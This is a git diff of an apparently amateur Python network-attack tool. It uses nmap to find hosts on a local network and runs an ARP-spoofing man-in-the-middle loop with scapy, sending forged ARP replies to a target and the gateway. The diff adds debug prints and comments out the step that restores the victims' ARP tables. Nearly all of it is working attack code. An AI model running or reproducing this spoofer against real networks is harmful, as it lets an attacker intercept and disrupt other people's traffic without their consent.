@@ -9,6 +9,7 @@ import netifaces as ni
 import argparse
 import time
 import scapy.all as scapy
+from uuid import getnode as get_mac
 
 
 if platform == "linux" or platform == "linux2":
@@ -116,12 +117,15 @@ def mitm():
         brand = list(scan['scan'][i]['vendor'].values())
         name = scan['scan'][i]['hostnames'][0]['name']
         if name == "lan.home":
-            spoof_ip = i[:-1]
+            spoof_ip = i
     scan = nm.scan(hosts = target, arguments='-sn')
     for i in scan['scan']:
         if i == target_ip:
             destinationMac = scan['scan'][i]['addresses']['mac']
-    
+            print("here")
+    for i in scan['scan']:
+        if i == local_ip:
+            print(local_ip)
     start(target_ip, spoof_ip, destinationMac)
 
 
@@ -144,17 +148,18 @@ def ip():
 
 def spoofer(targetIP, spoofIP, destinationMac):
     packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
+    print(packet)
     scapy.send(packet, verbose=False)
 
 def restore(destinationIP, sourceIP, destinationMac):
-    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=sourceMAC)
+    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=destinationMac,psrc=sourceIP,hwsrc=sourceMAC)
     scapy.send(packet, count=4,verbose=False)
 
 def start(targetIP, gatewayIP, destinationMac):
     packets = 0
-    print("here")
+    mitmattack = True
     try:
-        while True:
+        while mitmattack:
             spoofer(targetIP,gatewayIP, destinationMac)
             spoofer(gatewayIP,targetIP, destinationMac)
             print("\r[+] Sent packets "+ str(packets)),
@@ -162,9 +167,10 @@ def start(targetIP, gatewayIP, destinationMac):
             packets +=2
             time.sleep(2)
     except KeyboardInterrupt:
-        print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
-        restore(targetIP,gatewayIP, destinationMac)
-        restore(gatewayIP,targetIP, destinationMac)
+        print(colored(0, 255, 0, "\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state.."))
+        mitmattack = False
+        #restore(targetIP,gatewayIP, destinationMac)
+        #restore(gatewayIP,targetIP, destinationMac)
 
 def main():
     run = True
@@ -235,9 +241,6 @@ print("\n")
 print(colored(255, 0, 0, "      Hello"), colored(0, 255, 0, "{}".format(sc.gethostname())), colored(255, 0, 0, "I am nobody."))
 print("\n")
 
-#local_ip = sc.gethostbyname(sc.gethostname())
-#print(local_ip)
-
 try:
     ni.ifaddresses('eth0')
     local_ip = str(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
@@ -255,5 +258,7 @@ except ValueError:
 url = ["https://www.twitter.com/", "https://www.instagram.com/"]
 
 commands = ["exit", "scan", "help", "clear", "scan firewall", "mitm", "search", "scan all", "ip", "config"]
+
+sourceMAC  = str(get_mac())
 
 main()
